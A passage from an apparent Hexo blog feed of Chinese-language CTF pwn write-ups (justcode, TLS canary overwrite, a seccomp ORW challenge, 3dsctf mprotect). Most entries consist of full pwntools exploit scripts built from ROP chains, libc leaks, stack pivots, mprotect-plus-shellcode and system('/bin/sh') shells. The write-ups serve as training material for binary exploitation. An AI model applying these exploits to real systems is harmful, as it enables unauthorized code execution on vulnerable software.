class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>justcode</title>
      <link href="/posts/10973/"/>
      <url>/posts/10973/</url>
      
        <content type="html"><![CDATA[<p>利用方式：一个未初始化的变量和scanf缺少取地址符号导致的任意地址写</p><p>注意：循环中栈的地址是复用的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/miko/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_chk_fail=<span class="number">0x602038</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400ea3</span></span><br><span class="line">put_plt=<span class="number">0x400940</span></span><br><span class="line">libc_start_main_got=<span class="number">0x602050</span></span><br><span class="line">main=<span class="number">0x400D4B</span></span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x400901</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400C7F\nb *0x400D00&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your code:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(stack_chk_fail)</span><br><span class="line"><span class="comment">#payload=payload.ljust(0x80,b&#x27;a&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x400ea3</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;info:\n&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=p64(pop_rdi_ret)+p64(libc_start_main_got)+p64(put_plt)+p64(ret)+p64(main)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">true=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=true-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your code:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x400ea1</span></span><br><span class="line">pop_rdx_r10_ret=<span class="number">0x1151a4</span>+libcbase</span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+libcbase</span><br><span class="line">gets=libc.symbols[<span class="string">&#x27;gets&#x27;</span>]+libcbase</span><br><span class="line">addr=<span class="number">0x602000</span></span><br><span class="line">saveto=<span class="number">0x602300</span></span><br><span class="line"></span><br><span class="line">payload2=p64(pop_rdi_ret)+p64(saveto)+p64(gets)</span><br><span class="line">payload2+=p64(pop_rdi_ret)+p64(addr)+p64(pop_rsi_r15_ret)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(pop_rdx_r10_ret)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(saveto)</span><br><span class="line">payload2=payload2.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line">payload3=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">payload3+=shellcraft.read(<span class="number">0x3</span>,saveto,<span class="number">0x40</span>)</span><br><span class="line">payload3+=shellcraft.write(<span class="number">0x1</span>,saveto,<span class="number">0x40</span>)</span><br><span class="line">p.sendline(asm(payload3))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改tls</title>
      <link href="/posts/33489/"/>
      <url>/posts/33489/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>(1)gdb中使用<code>fsbase</code>指令可获得fs寄存器的值</p><p>(2)TLS（线程局部储存）：防止当一个线程卡死后对其它线程对全局变量或该函数内的static变量的使用产生影响，会在该线程开始时，拷贝一份全局变量和static变量到TLS段。线程的TLS段一般和栈段挨得很近</p><p>(3)线程题的canary比较：线程题的canary是把栈段的canary和TLS段的副本进行比较，所以要绕过canary的话，可以将栈段和TLS段的canary均覆盖成相同的值</p><p>(4)在 glibc 实现中，TLS 由段寄存器<code>fs</code>（x86-64 架构）指向。<code>TLS</code>在 <code>glibc</code>中的实现为 <code>tcbhead_t(TCB)</code>结构体，其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                 thread descriptor used by libpthread.  */</span></span><br><span class="line">    <span class="type">dtv_t</span> *dtv;</span><br><span class="line">    <span class="type">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">    <span class="type">int</span> multiple_threads;</span><br><span class="line">    <span class="type">int</span> gscope_flag;</span><br><span class="line">    <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">    <span class="type">uintptr_t</span> stack_guard;   <span class="comment">// fs:0x28 canary的值</span></span><br><span class="line">    <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">    ...</span><br><span class="line">  &#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>canary的值实际储存在<code>stack_guard</code>这一变量中,fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 <code>stack_guard</code></p><p>线程局部存储（Thread Local Storage）是一种机制，通过该机制分配变量，以便每一个现存的线程都有一个变量实例。<br>它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p><p>所以我们可以通过覆盖<code>rbp-8</code>处和<code>fs:[0x28]</code>处为相同的值,即可绕过canary</p><p><code>mov    rcx, qword ptr [rbp - 8]</code></p><p><code>xor    rcx, qword ptr fs:[0x28]</code></p><h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202307242143831.png"></p><p>做提前先用patchelf将glibc修改为2.23-0ubuntu11.3，否则有可能覆盖fs:[0x28]前就会崩溃</p><p>之后就是栈迁移+覆盖tls，贴下wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bs&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bs&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/miko/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400992&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;send?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;6128&#x27;</span>)</span><br><span class="line">libc_main_got=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="comment">#start=0x400810</span></span><br><span class="line">put_plt=<span class="number">0x4007C0</span></span><br><span class="line">pop_rdi=<span class="number">0x400c03</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x400c01</span></span><br><span class="line">leave_ret=<span class="number">0x400955</span></span><br><span class="line">read=<span class="number">0x4007E0</span></span><br><span class="line">bss=<span class="number">0x602310</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">4104</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>+p64(bss-<span class="number">0x8</span>)+p64(pop_rdi)+p64(libc_main_got)+p64(put_plt)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(read)+p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">6128</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;goodbye.\n&#x27;</span>)</span><br><span class="line">true=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(true))</span><br><span class="line">libcbase=true-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">system=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">sh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libcbase</span><br><span class="line">p.recv()</span><br><span class="line">payload2=p64(pop_rdi)+p64(sh)+p64(system)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>warm_up-seccomp沙箱(orw)</title>
      <link href="/posts/4673/"/>
      <url>/posts/4673/</url>
      
        <content type="html"><![CDATA[<p>检查下保护</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20100709.png" alt="屏幕截图 2023-06-24 100709"></p><p>使用了seccomp系统调用，也就是说开了沙箱，seccomp-tools看看禁用了什么</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20101358.png" alt="屏幕截图 2023-06-24 101358"></p><p>禁用了execve系统调用,system系统调用实际上会调用execve,所以通过system(‘&#x2F;bin&#x2F;sh’)来getshell是不可能的，所以我们换个思路，通过orw，即open一个文件(实际上打开的是一个文件描述符)，将文件的内容read到内存中，再将文件内容write到标准输出(stdout)</p><p>看看溢出函数</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20103437.png" alt="屏幕截图 2023-06-24 103437"></p><p>gdb调试偏移，填充24个字节后就是canary，canary最低位为<code>\x00</code>,所以用任意字符将<code>\x00</code>覆盖掉，通过printf即可泄露出canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br></pre></td></tr></table></figure><p> 继续调试，canary之后填充8个字节就是返回地址。但是我们要想orw得到flag，必须先写入orw的机器码，aslr会随机化栈的地址。所以我们选择存放在<code>bss段</code>或<code>got表</code></p><table><thead><tr><th></th><th><strong>作用位置</strong></th><th><strong>归属</strong></th><th><strong>作用时间</strong></th></tr></thead><tbody><tr><td>ASLR</td><td><strong>1</strong>：栈基地址（stack）、共享库（.so\libraries）、mmap 基地址<br/><strong>2</strong>：在<strong>1</strong>基础上，增加随机化堆基地址（chunk）</td><td>系统功能</td><td>作用于程序（ELF）装入内存运行时</td></tr><tr><td>PIE</td><td>代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）</td><td>编译器功能</td><td>作用于程序（ELF）编译过程中</td></tr></tbody></table><p><em>Nx enabled保护开启，堆栈不可执行，数据段不可执行，代码段不可写</em></p><p><em>Globle offset table全局偏移量表，位于数据段</em></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20105930.png"></p><p>可以看到,got表与bss段都没有可执行权限，所以需要mprotect函数修改权限为<code>0x7</code>，只有got表的地址是一个内存页<code>4k(0x1000)</code>的整数倍，所以修改got表权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mprotect_offset=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">gets=libc.symbols[<span class="string">&#x27;gets&#x27;</span>]+libcbase</span><br><span class="line">mprotect_true=libcbase+mprotect_offset</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2+=p64(rdi_ret)+p64(save)+p64(gets)</span><br><span class="line">payload2+=p64(rdi_ret)+p64(save)+p64(rsi_r15_ret)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)+p64(mprotect_true)+p64(save) <span class="comment">#写完机器码后跳转到相应的内存区域</span></span><br></pre></td></tr></table></figure><p>mprotect有三个参数，如果ROPgadget找不到<code>pop rdx;ret</code>,我们可以在libc中找到这个指令，值得注意的是，libc中找到的指令不一定有可执行权限，但<code>pop rdx;ret</code>指令也不是只有一个，要多试试</p><p><em>ROPgadget –binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 –only ‘pop|ret’ | grep rdx</em></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20112730.png" alt="屏幕截图 2023-06-24 112730"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload3 = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">payload3+ = shellcraft.read(<span class="number">0x3</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#文件描述符fd:是文件描述符0\1\2\3,代表标准的输入输出和出错,其他打开的文件</span></span><br><span class="line">payload3+ = shellcraft.write(<span class="number">0x1</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#文件描述符fd:是文件描述符0\1\2\3,代表标准的输入输出和出错,其他打开的文件</span></span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./warm_up&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;139.129.76.65&#x27;,50007)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./warm_up&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc_main_got=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">rdi_ret=<span class="number">0x400bc3</span></span><br><span class="line">rsi_r15_ret=<span class="number">0x400bc1</span></span><br><span class="line">start=<span class="number">0x400910</span></span><br><span class="line">save=<span class="number">0x601000</span></span><br><span class="line">save_to=<span class="number">0x601080</span></span><br><span class="line">p.recv()</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; ?&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(rdi_ret)+p64(<span class="number">0x400BEF</span>)+p64(rsi_r15_ret)</span><br><span class="line">payload2+=p64(libc_main_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(start)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">true=u64(p.recvuntil(<span class="string">b&#x27; ?&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">libcbase=true-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">mprotect_offset=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">gets=libc.symbols[<span class="string">&#x27;gets&#x27;</span>]+libcbase</span><br><span class="line">mprotect_true=libcbase+mprotect_offset</span><br><span class="line">rdx_ret=libcbase+<span class="number">0x000000000011f497</span></span><br><span class="line">p.recv()</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; ?&#x27;</span>)</span><br><span class="line"><span class="comment">#canary=u64(p.recv(8))-0xa</span></span><br><span class="line"><span class="comment">#print(hex(canary))</span></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2+=p64(rdi_ret)+p64(save)+p64(gets)</span><br><span class="line">payload2+=p64(rdi_ret)+p64(save)+p64(rsi_r15_ret)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)+p64(mprotect_true)+p64(save)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">payload3+ = shellcraft.read(<span class="number">0x3</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line">payload3+ = shellcraft.write(<span class="number">0x1</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line">p.sendline(asm(payload3))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#print(p.recv())</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>not_the_same_3dsctf_2016-mprotect提升权限</title>
      <link href="/posts/17975/"/>
      <url>/posts/17975/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-11%20100611.png"></p><p>这道题有两种解法，一种是fgets读取flag，另一种是mprotect提升权限，这里我们只介绍第二种解法</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-11%20102036.png"></p><p>checksec，题目只开了栈不可执行，其他保护没有开启</p><blockquote><p>int mprotect(void *addr, size_t len, int prot);</p><p><strong>addr</strong>：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB &#x3D;&#x3D; 4096字节）整数倍。<br><strong>len</strong>：被修改保护属性区域的长度,最好为页大小整数倍。</p><p><strong>prot</strong>:  内存的权限  # 0x7 &#x3D;&#x3D; 可读可写可执行</p><p>PROT_READ：可写，值为 1</p><p>PROT_WRITE：可读， 值为 2</p><p>PROT_EXEC：可执行，值为 4</p><p>PROT_NONE：不允许访问，值为 0</p></blockquote><p>程序有mprotect函数，所以我们可以用mprotect函数修改<code>got表</code>或<code>bss段</code>内存区域的权限为<code>0x7</code></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-11%20104610.png"></p><p><code>ctrl+s</code>打开程序的段表，观察到bss段的起始地址不是<code>4kb(0x1000)</code>的整数倍，所以选择修改got表</p><p>值得注意的是，这个程序没有关闭输入输出缓冲区，所以我们<code>recv</code>不到<code>b0r4 v3r s3 7u 4h o b1ch4o m3m0...</code> 直接发送数据即可</p><blockquote><p><strong>缓冲区的三种类型</strong></p><p>1.全缓冲</p><p>实际的I&#x2F;O操作只有在缓冲区被填满了之后才会进行。flush描述了标准I&#x2F;O缓冲的写操作。缓冲区可以由标准I&#x2F;O函数自动flush(例如缓冲区满的时候);或者我们调用fflush函数。</p><p>2.行缓冲</p><p>在这种情况下,只有在输入&#x2F;输出中遇到换行符的时候,才会执行实际的I&#x2F;O操作。这允许我们一次写一个字符,但是只有在写完一行之后才做I&#x2F;O操作。一般的,涉及到终端的流–例如标准输入(stdin)和标准输出(stdout)–是行缓冲的。</p><p>3.无缓冲</p><p>标准I&#x2F;O库不缓存字符。需要注意的是,标准库不缓存并不意味着操作系统或者设备驱动不缓存。</p><p><strong>缓冲区刷新</strong></p><ul><li>缓冲区满时;</li><li>执行flush语句，即使用特定函数刷新缓冲区;</li><li>执行endl语句，即行缓冲区遇到回车时(即’\n’);</li><li>关闭文件。</li></ul></blockquote><p>gdb计算出偏移，找出合适的gadget</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-11%20225733.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">45</span>+mprotect地址+gadget+参数addr+参数<span class="built_in">len</span>+参数prot </span><br><span class="line"><span class="comment">#mprotect函数修改got表权限为可读可写可执行</span></span><br><span class="line">payload1+=read地址+gadget+参数fd+参数buf+参数size</span><br><span class="line">payload1+=修改的内存地址 <span class="comment">#返回地址为将要执行shellcode的地址</span></span><br><span class="line">payload2=asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./not_&#x27;</span>)</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">got_addr=<span class="number">0x80EB000</span></span><br><span class="line">ebp_esi_edi=<span class="number">0x0809e3e5</span></span><br><span class="line">read_addr=<span class="number">0x806E200</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span 